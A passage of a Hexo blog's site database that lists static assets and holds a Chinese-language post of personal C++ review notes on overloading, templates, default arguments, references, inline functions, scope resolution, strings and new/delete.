ttf","hash":"5454ae941eeeda1fee8a1b9ef608dae39f58288e","modified":1594462350570},{"_id":"public/fonts/iconfont.woff","hash":"7222cdc09d819e340fd8cea8498d36270b0400b1","modified":1594462350570},{"_id":"public/images/favicon.png","hash":"bcb794b0ebbd8547fdeeeb4d9a1e2a141ca1aaad","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/sakuraso-symbol.svg","hash":"dd2a3d764889d23575a33251ff64761fb4bbb317","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/sakuraso.eot","hash":"509315fee1cbfcbfd9beec880032f75532df38af","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/sakuraso.ttf","hash":"91025ed91b9a317ddc835cc88d660c193a6c0228","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/sakuraso.svg","hash":"6eb5c281f77452342361ed3352f62e2dec0f3b5c","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/sakuraso.woff","hash":"00856819a670a578f78ffa2cae66717e21b24b36","modified":1594462350570},{"_id":"public/images/donate/BTCQR.jpg","hash":"573683048267ad49a2f1e94127ee8123c8a1c89c","modified":1594462350570},{"_id":"public/images/donate/alipay.svg","hash":"292ea040e865c1d0be259703ff850570b3bdfc97","modified":1594462350570},{"_id":"public/images/donate/WeChanQR .jpg","hash":"b62fe946f88f206dbe27ac069e4196a1c7217076","modified":1594462350570},{"_id":"public/images/donate/bitcoin.svg","hash":"eeb2ee8cf44ba5c298baeed84bb90866f4814955","modified":1594462350570},{"_id":"public/images/donate/WeChanSQ.jpg","hash":"b62fe946f88f206dbe27ac069e4196a1c7217076","modified":1594462350570},{"_id":"public/images/donate/github.svg","hash":"90ba9a3b0dc19e70e742a39b014194f801e00f97","modified":1594462350570},{"_id":"public/images/donate/wechat.svg","hash":"30418295bed44bcc4b29076eb7deed49cf4d6c1c","modified":1594462350570},{"_id":"public/images/donate/paypal.svg","hash":"e916dea1c1bba1bc935510310f65b2c9328a401a","modified":1594462350570},{"_id":"public/images/donate/like.svg","hash":"22a2754dc454d7b0321b70914fb2936b8d2ea8ab","modified":1594462350570},{"_id":"public/fonts/fontawesome-webfont.woff2","hash":"d6f48cba7d076fb6f2fd6ba993a75b9dc1ecbf0c","modified":1594462350570},{"_id":"public/images/logo2.jpg","hash":"42db414be6385c3f072d40e4da089fd76d8b0297","modified":1594462350570},{"_id":"public/images/donate/AliPayQR .jpg","hash":"7f657890395e23f4ea408eebda89fdff2d36c275","modified":1594462350570},{"_id":"public/images/cover/(1).jpg.webp","hash":"280a5c05256dca4fbea5af1bae208c19efce73a4","modified":1594462350570},{"_id":"public/css/insight.css","hash":"e3edf9f215f8b4bf6131a781edf2634df039796c","modified":1594462350570},{"_id":"public/css/APlayer.min.css","hash":"07372a2ba507388d0fed166d761b1c2c2a659dce","modified":1594462350570},{"_id":"public/css/categories-love.css","hash":"8987b6a6023b20f49877a462ba9e7edf86c6f3e8","modified":1594462350570},{"_id":"public/css/donate.css","hash":"fb5b21bae281772ea4e1df250d1d118edd8fe3ec","modified":1594462350570},{"_id":"public/css/sharejs.css","hash":"62b3ea2384cdf4f9dbce34e17f660856d51a605c","modified":1594462350570},{"_id":"public/css/jquery.fancybox.min.css","hash":"1be9b79be02a1cfc5d96c4a5e0feb8f472babd95","modified":1594462350570},{"_id":"public/css/zoom.css","hash":"e6feedd50deaf58cd27b33ed99f04f479c9fba31","modified":1594462350570},{"_id":"public/css/tag-bubble.css","hash":"50e487e6ef17fcd53baae3d15d25ffa2ebef672f","modified":1594462350570},{"_id":"public/css/bangumi.css","hash":"4d30d793a8813b14c55cee12d4a5adbb1cc7c535","modified":1594462350570},{"_id":"public/js/InsightSearch.js","hash":"3acae0bd3b55b16b93006466942de81b2a27b011","modified":1594462350570},{"_id":"public/js/bubble.js","hash":"db19d1d5866e7895212f07dca903f3b9a7b2a48d","modified":1594462350570},{"_id":"public/js/firework.js","hash":"233e9a9ed0e8aa4799bfbe02899f0c34f9af5a7b","modified":1594462350570},{"_id":"public/js/shehuizhuyi.js","hash":"57c00140f552d82cdc84fa2943e90a4240b8e932","modified":1594462350570},{"_id":"public/js/zoom.min.js","hash":"0b377c432d448cfc09c9e451128a48810a250926","modified":1594462350570},{"_id":"public/fonts/SAKURASO.old/icon.css","hash":"cca92568d623792d63db3706a705d3c77412d025","modified":1594462350570},{"_id":"public/404.html","hash":"ff7702a43a952708efbf6183f503d05b70d2a20c","modified":1594462350570},{"_id":"public/warn.html","hash":"6aadbd1652931925b7642cceec7de7ef9c3d9733","modified":1594462350570},{"_id":"public/css/font.css","hash":"714d3b9fbd98fdc398ce9aa60ec1d60d50628933","modified":1594462350570},{"_id":"public/js/sakura-app.js","hash":"46dc2e5334ac8b5a556382b0705e1a99ca97b857","modified":1594462350570},{"_id":"public/js/APlayer.min.js","hash":"22caa28ff6b41a16ff40f15d38f1739e22359478","modified":1594462350570},{"_id":"public/css/lib.min.css","hash":"3c4c8e1006dcc8e57e4a02e9d735a52c2a95cc72","modified":1594462350570},{"_id":"public/js/botui.js","hash":"7fd0a8b3a214c7840d4b1297195f3e9282b5cbb9","modified":1594462350570},{"_id":"public/js/jquery.fancybox.min.js","hash":"9e2b205a88c949fc8e6a7550d502dabe2b1ab4c0","modified":1594462350570},{"_id":"public/css/style.css","hash":"a793757f33429481d5595029ba4660e6b0fc8464","modified":1594462350570},{"_id":"public/js/lib.min.js","hash":"28f7ece281fef37370c561b7bca5285776ae8fd9","modified":1594462350570},{"_id":"public/images/cover/(4).jpg.webp","hash":"80c01a2eb27bae855b8017b9cd3f27c77f8a1ffa","modified":1594462350570},{"_id":"public/images/cover/(7).jpg.webp","hash":"6786f416448a82831adb845c57e88a5216b275a9","modified":1594462350570},{"_id":"public/images/cover/(8).jpg.webp","hash":"9477968db33a89a535ed185c0443cb3a89571adc","modified":1594462350570},{"_id":"public/images/cover/(3).jpg.webp","hash":"db47507ec3d0196765b89c87e15e31f0da2296da","modified":1594462350570},{"_id":"public/images/cover/(2).jpg.webp","hash":"2a0a7bf209f3fb840318b0decf4013d4dd7daadc","modified":1594462350570},{"_id":"public/images/cover/(6).jpg.webp","hash":"32a5cf178195a22fe724ff63003c6efbdc52b00f","modified":1594462350570},{"_id":"public/images/cover/(5).jpg.webp","hash":"6da529d56aafd651f663944a7c0b80aa358020c1","modified":1594462350570}],"Category":[{"name":"技术","_id":"ckchhpsg900039kq65riae4uc"},{"name":"生活","_id":"ckchhpshl001u9kq6apubeoev"}],"Data":[],"Page":[{"title":"文章分类","date":"2020-05-11T02:16:43.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: 文章分类\ndate: 2020-05-11 10:16:43\ntype: \"categories\"\n---\n","updated":"2020-05-11T02:18:14.763Z","path":"categories/index.html","comments":1,"layout":"page","_id":"ckchhpsg600019kq69lnz1ys1","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"文章分类","date":"2020-05-11T02:21:50.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: 文章分类\ndate: 2020-05-11 10:21:50\ntype: \"tags\"\n---\n","updated":"2020-05-11T02:23:34.066Z","path":"tags/index.html","comments":1,"layout":"page","_id":"ckchhpsi800299kq6arol4esz","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"C++复习","date":"2020-05-20T07:04:05.000Z","photos":["https://pics.images.ac.cn/image/5ece063c787c7.html"],"_content":"\n\n\n﻿前言：慢慢复习路！！！\n\n目录：\n0×01：函数的重载\n0×02：函数的模板\n0×03：有默认参数的函数\n0×04：变量的引用\n0×05：将引用作为函数参数\n0×06：内置函数\n0×07：作用域运算符\n0×08：字符串变量\n0×09：动态分配/撤销内存的运算符new和delete\n\n\n**0×01：函数的重载**\n          定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。\n\n例一：\n```\n\n#include <iostream>\nusing namespace std;\nint max(int a,int b,int c)           //求3个整数中的最大者\n{ if (b>a) a=b;\nif (c>a) a=c;\nreturn a; \n} \nfloat max(float a,float b, float c)  //求3个实数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a; \n} \nlong max(long a,long b,long c)  //求3个长整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n}\n```\n例二：\n```\nint main( )\n{int a,b,c;  float d,e,f;  long g,h,i;\ncin>>a>>b>>c; \ncin>>d>>e>>f;\ncin>>g>>h>>i;\nint m;\nm= max(a,b,c);                        //函数值为整型\ncout <<\"max_i=\"<<m<<endl;\nfloat n;\nn=max(d,e,f);                          //函数值为实型\ncout<<\"max_f=\"<<n<<endl;\nlong int p;\np=max(g,h,i);                          //函数值为长整型\ncout<<\"max_l=\"<<p<<endl;\nreturn 0;\n}\n```\n例三：\n```\n下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。\n#include <iostream>\nusing namespace std;\n\nint max(int a,int b,int c)     //求3个整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n}\n```\n注意：`不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。`\n\n**0×02：函数的模板**\n\n定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb)\n\n格式：\n\ttemplate typename 标识符[, typename 标识符, … … ]\n\t函数定义（函数的类型和参数的类型用声明的标识符表示）\ntemplate    是关键字，含义是模板\n\ttypename  是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。\n\t所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。\n\n例1  为计算两个数中的大数定义函数模板\n\n```\n#include <iostream>\nusing namespace std;\ntemplate <typename T>\nT max(T a,T b,T c)  //用虚拟类型T表示类型\n{if(b>a) a=b;\n if(c>a) a=c;\n return a;\n}\nint main()\n{int i1=8,i2=5,i3=6,i;\n double d1=56.9,d2=90.765,d3=43.1,d;\n long g1=67843,g2=-456,g3=78123,g;\n i=max(i1,i2,i3);\n d=max(d1,d2,d3);\n g=max(g1,g2,g3);\n cout<<\"i_max=\"<<i<<endl;\n cout<<\"d_max=\"<<d<<endl;\ncout<<\"g_max=\"<<g<<endl;\n return 0;\n}\n```\n注意：`从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。\n`\n**0×03：有默认参数的函数**\n\nC++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。\n\t格式：\n\t形参类型  形参变量名 = 常数\n\t功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。\n\t注意：`有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。`\n\n字面意思不好理解，例子奉上。\n\n```\n编写计算圆柱体体积函数\n\tfloat  volume ( float h, float r = 12.5)\n\n\t调用可以采用以下任何一种形式：\n\tvolume( 45.6);\n\tvolume( 32.5, 10.5);\n\t函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。\n```\n注意：`\n一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。\n二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。`\n\n**0×04：变量的引用**\n\nC++提供了为变量取别名的功能，这就是变量的引用。\n格式： 类型   &变量1 = 变量2\n变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。\n注意：两个变量不能用同一个别名。\n\n```\n例：int a = 3 ,b =4;\n\t       int &c = a;  //   c是a 的别名\n\t       int &c = b;  //   错误的用法\n\t一个变量可以有多个别名\n\t例：int a = 3;\n\t\t  int & b= a;\n\t\t  int & c= b;\n\t变量a 有两个别名b和c。\n```\n又来\n\n```\n#include <iostream>\nusing namespace std;\nint main( )\n{int a=10;\n int &b=a;    //声明b是a的引用\n a=a*a;       //a的值变化了，b的值也应一起变化\n cout<<a<<\"  \"<<b<<endl;   \n b=b/5;        //b的值变化了，a的值也应一起变化\n cout<<b<<\"  \"<<a<<endl;\n return 0;\n}\n```\n**0×05：将引用作为函数参数**\n\nC++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。\n\t（1）用普通变量做形参\n\t这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。\n\t\n\n```\n例：无法实现两个变量的值互换的程序\n#include <iostream>\nusing namespace std;\nvoid swap(int a,int b)\n{ int temp;\n temp=a;\n a=b;\n b=temp;                //  实现a和b的值互换\n}\nint main( )\n{int i=3,j=5;\n swap(i,j);\n cout<<i<<\",\"<<j<<endl;   //  i和j的值未互换\n return 0;\n}\n```\n（2）用指针变量做形参\n\nC语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。\n\t例1.11用指针变量做形参，实现两个变量值的交换。\n```\n#include <iostream>\nusing namespace std;\nvoid swap(int *p1,int *p2)\n{int temp;\n temp=*p1;\n *p1= *p2;\n *p2=temp;\n}\nint main( )\n{int i=3,j=5;\n swap(&i,&j);\n cout<<i<<\",\"<<j<<endl;\n return 0;\n}\n```\n3）用引用变量做形参\n\n用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。\n\n```\n例：利用引用变量实现两个变量值的交换\n#include <iostream>\nusing namespace std;\nvoid swap(int &a,int &b)\n{int temp;\n temp=a;\n a=b;\n b=temp;\n}\nint main( )\n{int i=3,j=5;\n swap(i,j);\n cout<<\"i=\"<<i<<\"   \"<<\"j=\"<<j<<endl;\n return 0;\n}\n```\n***对引用的进一步说明***\n（1）引用变量都具有非void类型\n（2）不能建立引用的数组\n（3）可以建立常引用变量，不允许修改常引用变量的值\n例： int i ;\n \t   const  int &a = i;\n \t   a = 3;   //    错误的用法\n \t   i  = 8;   //    i 不是常变量，可以修改\n \t   （4）可以建立指针变量的引用变量\n例：int i; \n \t  int  *p = & i;\n \t  int * &pt = p; // pt是p的别名变量，同时\n                            // 也是指针变量\n\n\n**0×06：内置函数**\n\nC++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。\n\t格式：\n\tinline 函数类型 函数名(形参表)\n\t{    函数体    } \n  \tinline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中\n\t调用格式：   函数名（实参表）\n\t\n\n```\n例：计算三个整数中的大数\n#include <iostream>\nusing namespace std;\ninline int max(int a,int b,int c)   // 这是一个内置函数，\n                                                 // 求3个整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n} \n\nint main( )\n{int i=7,j=10,k=25,m;\n m=max(i,j,k);\n cout<<\"max=\"<<m<<endl;\n return 0;\n}\n```\n由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成：\n\t{  a=i ; b = j ; c= k;\n\tif ( b>a) a=b;\n\tif ( c>a) a=c;\n\tm=a;  \n\t }\n\n\n```\n例:用内置函数计算平方根\n#include <iostream>\nusing namespace std;\ninline int power(int x)       //定义内置函数\n{return x*x;}\n\nint main()\n{cout<<power(2)<<endl;\n cout<<power(1+1)<<endl;\n return 0;\n}\n```\n\n编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成：\n\t{  cout<<2*2<<endl;\n\t   cout<<2*2<<endl;\n\t}\n\t运行结果是\n\t4\n\t4 \n\n\n优缺点：`使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。`\n\n**0×07：作用域运算符**\n直接看例子：\n\n```\n局部变量和全局变量同名\n\t#include <iostream>\n\tusing namespace std;\n\tfloat a=13.5;\n\tint main( )\n\t{    int a=5;\n\t     cout<<a<<endl;\n\t     return 0;    }\n```\n程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成\n\n```\n#include <iostream>\n\tusing namespace std;\n\tfloat a=13.5;\n\tint main( )\n\t{int a=5;\n\tcout<<a<<endl;\n\tcout<<::a<<endl;\n\t return 0;\n\t}\n```\n::a表示全局变量a。注意不能用::访问局部变量。\n\n**0×08：字符串变量**\n\nC++提供了字符串类类型string，实际上它不是C++的基本类型，它是在C++标准库中声明的一个字符串类，程序可以用它定义对象。\n\t1.定义字符串变量\n\t格式：  string 变量名表;\n\t可以在定义变量时用字符串常量为变量赋初值：\n\t\t\tstring   变量名 = 字符串常量\n\t**注意**：`如用字符串变量，在程序开始要用包含语句把C++标准库的string头文件包含进来。`\n\n2.对字符串操作\n① 对字符串变量赋值\n \t字符串变量= 字符串表达式\n例： string  st1,st2;\n \t   st1 = “王点点“;\n \t   st2 = st1;\n \t  \n ②  访问字符串中的字符\nC++允许把字符串作为字符数组，第一个字符的下标是0，第二个字符的下标是1，以此类推。\n例：string  w = “ then”;\n \t  w[2] = ‘e’;\n结果字符串w变成 than\n\n③输入输出字符串\n格式：cin >> 字符串变量\n           cout << 字符串变量\n\n④字符串连接运算\n格式：字符串1 + 字符串2\n功能：把连接运算符两端的字符连接成一个字符串。表达式中可以用字符串常量也可以用字符串变量。\n例：string  st1=“C++”;\n \t  string  st2=“Language”;\n \t  st1 = st1 + st2 ;\n结果是 C++Language\n\n⑤字符串的比较运算\n\t可以用关系运算符>、>=、==、!=、<、<=对两个字符串同一位置的字符进行比较，根据ASCII码值判定字符的大小。\n\t例：”china” > “chinese”\n\t运算结果是假。\n\n**0×09：动态分配/撤销内存的运算符new和delete** \n\n分配内存运算\nnew  类型 [ （初值）]\n类型是决定分配空间尺寸的关键元素，如果运算结果正确，它的值是分配内存空间的起始地址，否则返回NULL。\n\n```\n例：int  *a =new int ;\n \t  int  *b =new int( 100);\n \t  char *ch = new char[10];\n \t  int * q = new int [5][4];\n  \t  float  * p = new float(3.14159);\n```\n归还动态内存运算\ndelete[] 指针变量\n[] 代表数组，如果不是数组可以省略[]。\n运算功能：撤销指针变量所指的动态内存空间，指针变量的数据类型决定了空间尺寸的大小。\n\n```\n例：char *p=new char[10];\n        … …\n \t delete [ ] p;\n```\n\n```\n例1.18用动态内存存放结构体变量\n#include <iostream>\n#include <string.h>\nusing namespace std;\nstruct student \n{char name [10];\n int num;\n char sex;\n};\nint main ( )\n{student *p;\n p=new student;\n strcpy(p->name,\"Wang Fun\");\n p->num=10123;\n p->sex='M';\n cout<<p->name<<\"  \"<<p->num<<\"  \"<<p->sex<<endl;\n delete p;\n return 0;\n}\n```\n先声明了一个结构体类型student，定义一个指向它的指针变量p，用new开辟一个空间存放一个student类型变量。\n如果无法正常分配内存，运算会返回一个空指针NULL，程序可以设计判断结构，根据判断结果决定怎样操作。\n注意不要混合使用new、delete、malloc、free。要正确搭配，不要用new分配内存后，又用free释放内存。\n\n\n明天继续复习！！！\n","source":"_posts/C++复习——函数模板和函数的重载.md","raw":"---\ntitle: C++复习\ndate: 2020-05-20 15:04:05\ntags: c++学习\ncategories: 技术\nphotos: https://pics.images.ac.cn/image/5ece063c787c7.html\n---\n\n\n\n﻿前言：慢慢复习路！！！\n\n目录：\n0×01：函数的重载\n0×02：函数的模板\n0×03：有默认参数的函数\n0×04：变量的引用\n0×05：将引用作为函数参数\n0×06：内置函数\n0×07：作用域运算符\n0×08：字符串变量\n0×09：动态分配/撤销内存的运算符new和delete\n\n\n**0×01：函数的重载**\n          定义：C++允许在同一个域中用一个函数名定义多个函数，这些函数的参数个数、参数类型不相同。用一个函数名实现不同的功能，就是函数的重载。\n\n例一：\n```\n\n#include <iostream>\nusing namespace std;\nint max(int a,int b,int c)           //求3个整数中的最大者\n{ if (b>a) a=b;\nif (c>a) a=c;\nreturn a; \n} \nfloat max(float a,float b, float c)  //求3个实数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a; \n} \nlong max(long a,long b,long c)  //求3个长整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n}\n```\n例二：\n```\nint main( )\n{int a,b,c;  float d,e,f;  long g,h,i;\ncin>>a>>b>>c; \ncin>>d>>e>>f;\ncin>>g>>h>>i;\nint m;\nm= max(a,b,c);                        //函数值为整型\ncout <<\"max_i=\"<<m<<endl;\nfloat n;\nn=max(d,e,f);                          //函数值为实型\ncout<<\"max_f=\"<<n<<endl;\nlong int p;\np=max(g,h,i);                          //函数值为长整型\ncout<<\"max_l=\"<<p<<endl;\nreturn 0;\n}\n```\n例三：\n```\n下面的例子说明用函数重载设计参数个数不同的函数，用一个函数名求两个整数或三个整数中的最大数。\n#include <iostream>\nusing namespace std;\n\nint max(int a,int b,int c)     //求3个整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n}\n```\n注意：`不允许函数参数个数、参数类型都相同，只是函数返回值不同。因为系统无法从调用形式上判断调用与哪个函数相匹配。`\n\n**0×02：函数的模板**\n\n定义：如果两个函数的参数个数相同，函数的行为相同（做同样的事），只是函数和参数的数据类型不同，如果用函数重载的话，编写的函数代码是相同的，为了节省时间，C++提供了函数模板功能。(C++比C语言方便多了，小声bb)\n\n格式：\n\ttemplate typename 标识符[, typename 标识符, … … ]\n\t函数定义（函数的类型和参数的类型用声明的标识符表示）\ntemplate    是关键字，含义是模板\n\ttypename  是关键字，表示其后的标识符代表类型参数，调用时根据实参的类型确定形参的类型。\n\t所谓函数模板，是建立一个通用函数，不指定函数类型和参数类型，而用一个虚拟的类型表示。在调用函数时，用实参的类型取代模板中的虚拟类型。\n\n例1  为计算两个数中的大数定义函数模板\n\n```\n#include <iostream>\nusing namespace std;\ntemplate <typename T>\nT max(T a,T b,T c)  //用虚拟类型T表示类型\n{if(b>a) a=b;\n if(c>a) a=c;\n return a;\n}\nint main()\n{int i1=8,i2=5,i3=6,i;\n double d1=56.9,d2=90.765,d3=43.1,d;\n long g1=67843,g2=-456,g3=78123,g;\n i=max(i1,i2,i3);\n d=max(d1,d2,d3);\n g=max(g1,g2,g3);\n cout<<\"i_max=\"<<i<<endl;\n cout<<\"d_max=\"<<d<<endl;\ncout<<\"g_max=\"<<g<<endl;\n return 0;\n}\n```\n注意：`从程序中看到，此问题用函数模板比用函数重载更方便。注意，函数模板只适用于函数参数的个数相同而类型不同，并且函数体相同的情况，如果函数的参数个数不同，则不能用函数模板。\n`\n**0×03：有默认参数的函数**\n\nC++允许为函数的参数设置默认值，这时调用函数时，如果没有实参，就以默认值作为实参值。\n\t格式：\n\t形参类型  形参变量名 = 常数\n\t功能：调用函数时，如果没有实参，就以常数作为该形参的值;如果有实参，仍以实参的值作为该形参的值。\n\t注意：`有默认值的形参必须放在形参表的右边，不允许无默认参数值和有默认参数值的形参交错排列。`\n\n字面意思不好理解，例子奉上。\n\n```\n编写计算圆柱体体积函数\n\tfloat  volume ( float h, float r = 12.5)\n\n\t调用可以采用以下任何一种形式：\n\tvolume( 45.6);\n\tvolume( 32.5, 10.5);\n\t函数参数结合从左到右，用第一种方式调用时，只有一个实参，圆半径的值取默认值12.5，用第二种方式调用时，有两个实参，圆半径的值取实参的值10.5。\n```\n注意：`\n一、如果用函数原型声明，只要在函数原型声明中定义形参的默认值即可。\n二、一个函数名不能同时用于重载函数和带默认形参值的函数。当调用函数时，如少写一个参数，系统无法判断是利用重载函数还是利用带默认参数值的函数，出现二义性。`\n\n**0×04：变量的引用**\n\nC++提供了为变量取别名的功能，这就是变量的引用。\n格式： 类型   &变量1 = 变量2\n变量2是在此之前已经定义过的变量，且与变量1的类型相同。这里为变量2定义一个别名变量1，在程序里变量1和变量2 就是同一个变量。\n注意：两个变量不能用同一个别名。\n\n```\n例：int a = 3 ,b =4;\n\t       int &c = a;  //   c是a 的别名\n\t       int &c = b;  //   错误的用法\n\t一个变量可以有多个别名\n\t例：int a = 3;\n\t\t  int & b= a;\n\t\t  int & c= b;\n\t变量a 有两个别名b和c。\n```\n又来\n\n```\n#include <iostream>\nusing namespace std;\nint main( )\n{int a=10;\n int &b=a;    //声明b是a的引用\n a=a*a;       //a的值变化了，b的值也应一起变化\n cout<<a<<\"  \"<<b<<endl;   \n b=b/5;        //b的值变化了，a的值也应一起变化\n cout<<b<<\"  \"<<a<<endl;\n return 0;\n}\n```\n**0×05：将引用作为函数参数**\n\nC++除了可以用普通变量、指针变量做形参外，还可以用引用变量做形参。\n\t（1）用普通变量做形参\n\t这时传递的是实参的值，在函数内形参与实参是两个不同的内存单元，对形参的修改不会影响实参的值。\n\t\n\n```\n例：无法实现两个变量的值互换的程序\n#include <iostream>\nusing namespace std;\nvoid swap(int a,int b)\n{ int temp;\n temp=a;\n a=b;\n b=temp;                //  实现a和b的值互换\n}\nint main( )\n{int i=3,j=5;\n swap(i,j);\n cout<<i<<\",\"<<j<<endl;   //  i和j的值未互换\n return 0;\n}\n```\n（2）用指针变量做形参\n\nC语言还允许用指针变量做形参，这时传递的是实参变量的地址（指针），在函数内利用这个指针访问实参变量。\n\t例1.11用指针变量做形参，实现两个变量值的交换。\n```\n#include <iostream>\nusing namespace std;\nvoid swap(int *p1,int *p2)\n{int temp;\n temp=*p1;\n *p1= *p2;\n *p2=temp;\n}\nint main( )\n{int i=3,j=5;\n swap(&i,&j);\n cout<<i<<\",\"<<j<<endl;\n return 0;\n}\n```\n3）用引用变量做形参\n\n用指针变量做形参，它将实参变量的地址传递给形参，在函数内用“*指针变量”的方式访问实参变量。我们知道引用变量是变量的别名，在调用函数时，用引用变量做的形参就成了实参变量的别名，在函数中用的形参名就是实参的别名，这样比用指针变量更直观、更方便。\n\n```\n例：利用引用变量实现两个变量值的交换\n#include <iostream>\nusing namespace std;\nvoid swap(int &a,int &b)\n{int temp;\n temp=a;\n a=b;\n b=temp;\n}\nint main( )\n{int i=3,j=5;\n swap(i,j);\n cout<<\"i=\"<<i<<\"   \"<<\"j=\"<<j<<endl;\n return 0;\n}\n```\n***对引用的进一步说明***\n（1）引用变量都具有非void类型\n（2）不能建立引用的数组\n（3）可以建立常引用变量，不允许修改常引用变量的值\n例： int i ;\n \t   const  int &a = i;\n \t   a = 3;   //    错误的用法\n \t   i  = 8;   //    i 不是常变量，可以修改\n \t   （4）可以建立指针变量的引用变量\n例：int i; \n \t  int  *p = & i;\n \t  int * &pt = p; // pt是p的别名变量，同时\n                            // 也是指针变量\n\n\n**0×06：内置函数**\n\nC++ 提供了一种机制，在编译时，将所调用的函数的代码嵌入到调用函数代码中，在执行函数时省去了调用环节，提高了函数的执行速度。这种机制称为内置函数，有的书称内联函数。\n\t格式：\n\tinline 函数类型 函数名(形参表)\n\t{    函数体    } \n  \tinline 是C++的关键字，在编译时，编译程序会把这个函数嵌入到调用函数的函数体中\n\t调用格式：   函数名（实参表）\n\t\n\n```\n例：计算三个整数中的大数\n#include <iostream>\nusing namespace std;\ninline int max(int a,int b,int c)   // 这是一个内置函数，\n                                                 // 求3个整数中的最大者\n{if (b>a) a=b;\n if (c>a) a=c;\n return a;\n} \n\nint main( )\n{int i=7,j=10,k=25,m;\n m=max(i,j,k);\n cout<<\"max=\"<<m<<endl;\n return 0;\n}\n```\n由于在定义函数时指定它是内置函数，因此编译系统在遇到函数调用max( i,j,k ) 时就用max函数体的代码代替max( i,j,k ) ，同时用实参代替形参。调用语句m= max( i,j,k ) 就被置换成：\n\t{  a=i ; b = j ; c= k;\n\tif ( b>a) a=b;\n\tif ( c>a) a=c;\n\tm=a;  \n\t }\n\n\n```\n例:用内置函数计算平方根\n#include <iostream>\nusing namespace std;\ninline int power(int x)       //定义内置函数\n{return x*x;}\n\nint main()\n{cout<<power(2)<<endl;\n cout<<power(1+1)<<endl;\n return 0;\n}\n```\n\n编译程序遇见内置函数power时，先求出函数的实参值（1+1=2），然后用power函数体代替函数调用，调用语句变成：\n\t{  cout<<2*2<<endl;\n\t   cout<<2*2<<endl;\n\t}\n\t运行结果是\n\t4\n\t4 \n\n\n优缺点：`使用内置函数可以节省程序的运行时间，但增加了目标程序的长度。所以在使用时要衡量时间和空间的得失。`\n\n**0×07：作用域运算符**\n直接看例子：\n\n```\n局部变量和全局变量同名\n\t#include <iostream>\n\tusing namespace std;\n\tfloat a=13.5;\n\tint main( )\n\t{    int a=5;\n\t     cout<<a<<endl;\n\t     return 0;    }\n```\n程序中有两个变量a，一个是全局变量，另一个是main函数的局部变量，根据局部变量会屏蔽同名的全局变量规则，在函数中出现的变量a是局部变量，因此输出的值是5，而不是13.5，为了在函数中访问全局变量C++提供了作用域运算符 :: ，可以用来指定要访问的作用域，可以把main函数改写成\n\n```\n#include <iostream>\n\tusing namespace std;\n\tfloat a=13.5;\n\tint main( )\n\t{int a=5;\n\tcout<<a<<endl;\n\tcout<<::a<<endl;\n\t return 